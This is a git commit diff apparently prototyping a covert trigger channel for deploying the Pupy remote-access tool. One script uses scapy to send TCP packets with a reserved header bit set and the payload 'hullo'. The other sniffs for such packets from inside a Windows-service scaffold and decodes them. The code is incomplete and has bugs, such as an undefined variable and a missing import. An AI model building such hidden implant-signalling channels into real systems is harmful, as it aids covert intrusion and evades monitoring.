84bfbe440391267c6b7b26de6743dab98d206061
JonLMyers <jlm4508@rit.edu>
2019-11-05 23:22:58 -0500

    Added tested server components

--- pupy_deploy.py
+++ pupy_deploy.py
@@ -1,5 +1,7 @@
 import scapy
+from scapy.all import IP,TCP,send,Raw
 
 def main():
-    packet = send(IP(src='127.0.0.1', dst='192.168.1.151')/TCP(sport=443,dport=1337,reserved=1))
+    data = "hullo"
+    packet = send(IP(src='127.0.0.1', dst='192.168.1.151')/TCP(sport=443,dport=1337,reserved=1) / Raw(load=data))
     packet = Ether()/IP(src='127.0.0.1', dst='192.168.1.151')/TCP(dport=443,flags='S',reserved=1)     
--- test.py
+++ test.py
@@ -1,16 +1,37 @@
 import socket
 import struct
+import binascii
 import pyshark
 import win32serviceutil
 import servicemanager
 import win32event
 import win32service
 
+def deploy_config(hex_data):
+    # pyshark LayerObject to string
+    hex_data = str(hex_data)
+    # string to Formatted string
+    hex_str = hex_data.replace(':', '')
+    #Formatted string to formated hex(0x00 -> 00)
+    raw_hex = hex(int(hex_str, 16))[2:]
+    #fromated hex to decoded string
+    print(bytearray.fromhex(raw_hex).decode())
+
+def test_deploy_config():
+    deploy_config("68:75:6c:6c:6f")
+
 def main():
-    capture = pyshark.LiveCapture(bpf_filter='(tcp src port 443) and (tcp[13] & 2 != 0)')
+    # Offset (4) Reserved (3) NS flag (1)
+    # 0000 0010
+    capture = pyshark.LiveCapture(bpf_filter='(tcp src port 443) and (tcp[12] & 2 != 0)')
+    #capture = pyshark.LiveCapture(bpf_filter='(tcp src port 443) and (tcp dst port 1337)')
     while True:
-        for packet in capture.sniff_continuously(packet_count=50):
-            print('Just arrived:', packet)
+        for packet in capture.sniff_continuously(packet_count=1):
+            deploy_config(packet.tcp.get_field_value("payload"))
+            try:
+                deploy_config(raw_data)
+            except:
+                print("Error: No Data")
 
-
-main()
+#main()
+test_deploy_config()
